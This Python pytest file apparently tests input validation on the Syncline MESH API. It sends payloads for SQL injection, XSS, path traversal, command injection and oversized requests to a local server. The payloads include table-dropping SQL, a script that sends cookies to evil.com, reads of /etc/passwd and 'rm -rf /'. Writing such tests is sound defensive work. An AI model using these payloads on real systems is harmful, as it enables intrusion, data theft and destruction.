"""
Input Validation Security Tests for Syncline MESH

Test Cases:
- Test Case 25: SQL Injection Attempts
- Test Case 26: Cross-Site Scripting (XSS)
- Test Case 27: Oversized Request Payloads

These tests validate that input validation mechanisms properly
protect against injection attacks and malicious payloads.

Run with:
    pytest test_input_validation.py -v
"""

import pytest
import httpx
import os
import sys
from typing import List, Dict, Any

sys.path.insert(0, os.path.join(os.path.dirname(__file__), "..", ".."))


class TestInputValidationSecurity:
    """
    Input Validation Security Test Suite
    
    Validates protection against injection attacks and malformed input.
    """
    
    BASE_URL = os.getenv("TEST_URL", "http://localhost:8000")
    AUTH_TOKEN = "test_security_token"
    
    @pytest.fixture
    def client(self) -> httpx.Client:
        return httpx.Client(base_url=self.BASE_URL, timeout=30.0)
    
    @pytest.fixture
    def auth_headers(self) -> Dict[str, str]:
        return {"Authorization": f"Bearer {self.AUTH_TOKEN}"}
    
    # ==========================================================================
    # Test Case 25: SQL Injection Attempts
    # ==========================================================================
    
    def test_tc25_sql_injection_in_search(self, client, auth_headers):
        """
        Test Case 25: SQL Injection Attempts
        
        Test: Search queries with SQL injection payloads
        Expected: Parameterized queries prevent injection; malicious input treated as literal
        """
        sql_injection_payloads = [
            "'; DROP TABLE messages; --",
            "1' OR '1'='1",
            "1'; DELETE FROM users WHERE '1'='1",
            "1 UNION SELECT * FROM users --",
            "'; INSERT INTO users VALUES ('hacker', 'password'); --",
            "1' AND 1=1 UNION SELECT username,password FROM users--",
            "' OR 1=1--",
            "admin'--",
            "') OR ('1'='1",
            "1; SELECT * FROM users",
        ]
        
        for payload in sql_injection_payloads:
            response = client.get(
                "/api/v1/messages/search",
                headers=auth_headers,
                params={"query": payload, "limit": 10}
            )
            
            # Should not cause a server error (500)
            assert response.status_code != 500, \
                f"SQL injection payload caused server error: {payload}"
            
            # Successful response should not expose sensitive data
            if response.status_code == 200:
                data = response.json()
                # Should not contain obvious signs of SQL error or injection success
                response_text = str(data).lower()
                assert "syntax error" not in response_text, \
                    f"SQL syntax error exposed: {payload}"
                assert "sql" not in response_text or "error" not in response_text, \
                    f"SQL error exposed: {payload}"
        
        print(f"\n✅ Test Case 25: PASS - {len(sql_injection_payloads)} SQL injection attempts blocked")
    
    def test_tc25_sql_injection_in_message_id(self, client, auth_headers):
        """
        Test Case 25 (Extended): SQL injection in URL parameters
        """
        injection_ids = [
            "1'; DROP TABLE messages;--",
            "1 OR 1=1",
            "../../../etc/passwd",
            "1; SELECT * FROM users",
        ]
        
        for injection_id in injection_ids:
            response = client.get(
                f"/api/v1/messages/{injection_id}",
                headers=auth_headers
            )
            
            # Should return 400 (bad request), 404 (not found), or sanitized response
            assert response.status_code in [400, 404, 422, 401, 403], \
                f"Injection in URL parameter not handled: {injection_id}"
        
        print("\n✅ Test Case 25 (Extended): SQL injection in URL parameters blocked")
    
    def test_tc25_sql_injection_in_json_body(self, client, auth_headers):
        """
        Test Case 25 (Extended): SQL injection in JSON request body
        """
        injection_payloads = [
            {"content": "'; DROP TABLE messages; --", "sender": "attacker"},
            {"query": "1 UNION SELECT * FROM users", "limit": 10},
            {"filter": {"field": "'; DELETE FROM users; --", "value": "test"}},
        ]
        
        for payload in injection_payloads:
            response = client.post(
                "/api/v1/messages/search",
                headers=auth_headers,
                json=payload
            )
            
            # Should handle gracefully (not 500)
            if response.status_code == 500:
                pytest.fail(f"SQL injection in body caused server error: {payload}")
        
        print("\n✅ Test Case 25 (Extended): SQL injection in JSON body blocked")
    
    # ==========================================================================
    # Test Case 26: Cross-Site Scripting (XSS)
    # ==========================================================================
    
    def test_tc26_xss_in_message_content(self, client, auth_headers):
        """
        Test Case 26: Cross-Site Scripting (XSS)
        
        Test: Message content containing <script>alert('XSS')</script>
        Expected: HTML content escaped in API responses; scripts not executed
        """
        xss_payloads = [
            "<script>alert('XSS')</script>",
            "<img src='x' onerror='alert(1)'>",
            "<svg onload='alert(1)'>",
            "javascript:alert('XSS')",
            "<iframe src='javascript:alert(1)'></iframe>",
            "<body onload='alert(1)'>",
            "<div style='background:url(javascript:alert(1))'>",
            "'-alert(1)-'",
            "<script>document.location='http://evil.com/?c='+document.cookie</script>",
            "<img src=x onerror=alert(document.domain)>",
        ]
        
        for payload in xss_payloads:
            # Test 1: Create message with XSS payload
            create_response = client.post(
                "/api/v1/messages",
                headers=auth_headers,
                json={
                    "content": payload,
                    "sender_id": "test_sender",
                    "platform": "test"
                }
            )
            
            if create_response.status_code in [200, 201]:
                data = create_response.json()
                content = data.get("content", "")
                
                # Content should be escaped or sanitized
                assert "<script>" not in content, \
                    f"XSS payload not escaped in response: {payload}"
                assert "onerror=" not in content and "onload=" not in content, \
                    f"XSS event handler not escaped: {payload}"
            
            # Test 2: Search with XSS payload (should be escaped in results)
            search_response = client.get(
                "/api/v1/messages/search",
                headers=auth_headers,
                params={"query": payload, "limit": 10}
            )
            
            if search_response.status_code == 200:
                response_text = search_response.text
                
                # Response should have content-type: application/json (not HTML)
                content_type = search_response.headers.get("content-type", "")
                assert "application/json" in content_type, \
                    "API should return JSON, not HTML"
        
        print(f"\n✅ Test Case 26: PASS - {len(xss_payloads)} XSS payloads handled safely")
    
    def test_tc26_xss_in_contact_name(self, client, auth_headers):
        """
        Test Case 26 (Extended): XSS in contact names
        """
        xss_name = "<script>alert('XSS')</script>"
        
        response = client.post(
            "/api/v1/contacts",
            headers=auth_headers,
            json={
                "name": xss_name,
                "email": "test@example.com"
            }
        )
        
        if response.status_code in [200, 201]:
            data = response.json()
            name = data.get("name", "")
            
            # Name should be escaped
            assert "<script>" not in name, \
                "XSS in contact name not escaped"
        
        print("\n✅ Test Case 26 (Extended): XSS in contact names blocked")
    
    def test_tc26_content_type_headers(self, client, auth_headers):
        """
        Test Case 26 (Extended): Verify security headers
        """
        response = client.get(
            "/api/v1/messages",
            headers=auth_headers
        )
        
        # Check for security headers
        headers = response.headers
        
        # Content-Type should not be text/html (to prevent XSS)
        content_type = headers.get("content-type", "")
        if response.status_code == 200:
            assert "text/html" not in content_type.lower(), \
                "API should not return text/html"
        
        # X-Content-Type-Options should be nosniff
        x_content_type = headers.get("x-content-type-options", "")
        if x_content_type:
            assert x_content_type.lower() == "nosniff", \
                "X-Content-Type-Options should be nosniff"
        
        print("\n✅ Test Case 26 (Extended): Content-Type headers verified")
    
    # ==========================================================================
    # Test Case 27: Oversized Request Payloads
    # ==========================================================================
    
    def test_tc27_oversized_json_body(self, client, auth_headers):
        """
        Test Case 27: Oversized Request Payloads
        
        Test: API requests with 10MB+ JSON bodies
        Expected: Request size limits enforced; oversized requests rejected with 413
        """
        # Create a ~11MB payload
        large_payload = {
            "content": "A" * (11 * 1024 * 1024),  # 11MB of 'A' characters
            "metadata": {"test": True}
        }
        
        try:
            response = client.post(
                "/api/v1/messages",
                headers=auth_headers,
                json=large_payload,
                timeout=60.0  # May take a while to send
            )
            
            # Should be rejected with 413 (Payload Too Large) or 400 (Bad Request)
            assert response.status_code in [413, 400, 422], \
                f"Oversized payload should be rejected, got {response.status_code}"
            
            print("\n✅ Test Case 27: PASS - 10MB+ payloads rejected")
            
        except httpx.ReadTimeout:
            # Timeout is acceptable for large payloads
            print("\n✅ Test Case 27: PASS - Server timeout on oversized payload")
        except httpx.RemoteProtocolError:
            # Connection closed by server
            print("\n✅ Test Case 27: PASS - Connection closed for oversized payload")
    
    def test_tc27_oversized_query_parameters(self, client, auth_headers):
        """
        Test Case 27 (Extended): Oversized query parameters
        """
        # Very long query string
        long_query = "A" * 100000  # 100KB query
        
        response = client.get(
            "/api/v1/messages/search",
            headers=auth_headers,
            params={"query": long_query}
        )
        
        # Should be rejected or truncated
        assert response.status_code in [400, 413, 414, 422, 500], \
            f"Oversized query should be rejected, got {response.status_code}"
        
        print("\n✅ Test Case 27 (Extended): Oversized query parameters blocked")
    
    def test_tc27_deep_json_nesting(self, client, auth_headers):
        """
        Test Case 27 (Extended): Deeply nested JSON to prevent stack overflow
        """
        # Create deeply nested JSON (1000 levels)
        nested = {"value": "deep"}
        for _ in range(1000):
            nested = {"nested": nested}
        
        try:
            response = client.post(
                "/api/v1/messages",
                headers=auth_headers,
                json=nested
            )
            
            # Should handle gracefully
            assert response.status_code in [400, 413, 422, 500], \
                "Deep nesting should be rejected"
            
            print("\n✅ Test Case 27 (Extended): Deep JSON nesting handled")
            
        except Exception as e:
            # Any exception is acceptable (the attack was blocked)
            print(f"\n✅ Test Case 27 (Extended): Deep nesting blocked ({type(e).__name__})")
    
    def test_tc27_many_array_elements(self, client, auth_headers):
        """
        Test Case 27 (Extended): Very large arrays in JSON
        """
        # Create array with 1 million elements
        large_array = {
            "items": list(range(1000000))
        }
        
        try:
            response = client.post(
                "/api/v1/messages/batch",
                headers=auth_headers,
                json=large_array,
                timeout=30.0
            )
            
            # Should be rejected
            assert response.status_code in [400, 413, 422, 404], \
                "Large array should be rejected"
            
            print("\n✅ Test Case 27 (Extended): Large arrays handled")
            
        except (httpx.ReadTimeout, httpx.RemoteProtocolError):
            print("\n✅ Test Case 27 (Extended): Large array request blocked")


class TestInputSanitization:
    """
    Input Sanitization Tests
    
    Validates that inputs are properly sanitized before processing.
    """
    
    BASE_URL = os.getenv("TEST_URL", "http://localhost:8000")
    AUTH_TOKEN = "test_security_token"
    
    @pytest.fixture
    def client(self) -> httpx.Client:
        return httpx.Client(base_url=self.BASE_URL, timeout=30.0)
    
    @pytest.fixture
    def auth_headers(self) -> Dict[str, str]:
        return {"Authorization": f"Bearer {self.AUTH_TOKEN}"}
    
    def test_null_bytes_rejected(self, client, auth_headers):
        """Null bytes should be rejected or stripped."""
        payload = {
            "content": "Test\x00Message",
            "sender": "test\x00user"
        }
        
        response = client.post(
            "/api/v1/messages",
            headers=auth_headers,
            json=payload
        )
        
        if response.status_code in [200, 201]:
            data = response.json()
            content = data.get("content", "")
            assert "\x00" not in content, "Null bytes should be stripped"
        
        print("\n✅ Null bytes handled properly")
    
    def test_unicode_normalization(self, client, auth_headers):
        """Unicode should be properly normalized."""
        # Different Unicode representations of the same character
        payloads = [
            {"content": "café"},  # composed
            {"content": "cafe\u0301"},  # decomposed
        ]
        
        for payload in payloads:
            response = client.post(
                "/api/v1/messages",
                headers=auth_headers,
                json=payload
            )
            
            # Should not cause issues
            assert response.status_code != 500, \
                f"Unicode handling caused error: {payload}"
        
        print("\n✅ Unicode normalization working")
    
    def test_path_traversal_blocked(self, client, auth_headers):
        """Path traversal attempts should be blocked."""
        traversal_attempts = [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32",
            "....//....//....//etc/passwd",
            "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
        ]
        
        for path in traversal_attempts:
            # In file-related endpoints
            response = client.get(
                f"/api/v1/files/{path}",
                headers=auth_headers
            )
            
            # Should not expose system files
            assert response.status_code in [400, 404, 403], \
                f"Path traversal should be blocked: {path}"
        
        print("\n✅ Path traversal attempts blocked")
    
    def test_command_injection_blocked(self, client, auth_headers):
        """Command injection attempts should be blocked."""
        injection_payloads = [
            "; ls -la",
            "| cat /etc/passwd",
            "$(whoami)",
            "`id`",
            "&& rm -rf /",
        ]
        
        for payload in injection_payloads:
            response = client.post(
                "/api/v1/messages",
                headers=auth_headers,
                json={"content": payload}
            )
            
            # Should not execute commands (and not error)
            # We can't easily verify no command ran, but 500 would indicate issues
            assert response.status_code != 500, \
                f"Command injection caused error: {payload}"
        
        print("\n✅ Command injection attempts handled safely")


if __name__ == "__main__":
    pytest.main([__file__, "-v", "-s"])
